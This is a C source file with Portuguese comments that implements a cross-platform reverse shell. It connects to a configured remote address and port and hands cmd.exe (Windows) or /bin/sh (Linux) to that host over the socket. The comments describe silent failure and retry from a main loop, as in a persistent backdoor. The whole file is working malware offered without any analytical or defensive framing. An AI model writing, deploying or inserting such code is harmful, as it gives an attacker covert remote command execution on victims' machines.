#include "main.h"
#include <string.h>

#if defined(_WIN32) || defined(_WIN64)

void shell() {
    WSADATA wsaData;
    SOCKET sockfd;
    struct sockaddr_in server_addr;

    // 1. Inicializar Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }

    // O resto é muito similar, mas com tipos do Windows (SOCKET)
    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sockfd == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

#else // Implementação para Linux
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

void shell()
{
    int sockfd;
    struct sockaddr_in server_addr;

    // 1. Criar o socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        return; // Falha silenciosa, o loop no main tentará novamente
    }
#endif

    // 2. Configurar o endereço do servidor
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(remote_port);
    server_addr.sin_addr.s_addr = inet_addr(remote_addr);
    
    // 3. Tentar conectar ao servidor
#if defined(_WIN32) || defined(_WIN64)
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        closesocket(sockfd);
        WSACleanup();
        return;
    }
#else
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(sockfd);
        return; // Falha na conexão, o loop no main tentará novamente
    }
#endif

    // Conexão bem-sucedida
    send(sockfd, "\nConnection done!\n", 18, 0);
    send(sockfd, "Connected in machine\n", 21, 0);

#if defined(_WIN32) || defined(_WIN64)
    // 4. Redirecionar I/O para o socket no Windows
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sockfd;

    // 5. Executar o shell do Windows
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    closesocket(sockfd);
    WSACleanup();
#else
    // 4. Redirecionar stdin, stdout, stderr para o socket
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    // 5. Executar o shell
    // Foco no Linux, como sugerido pelos outros comandos.
    char *cmd[] = { "/bin/sh", NULL };
    char *env[] = { "HOME=/root", "TERM=xterm", NULL };
    execve(cmd[0], cmd, env);

    // O código abaixo só é executado se execve falhar
    close(sockfd);
#endif
}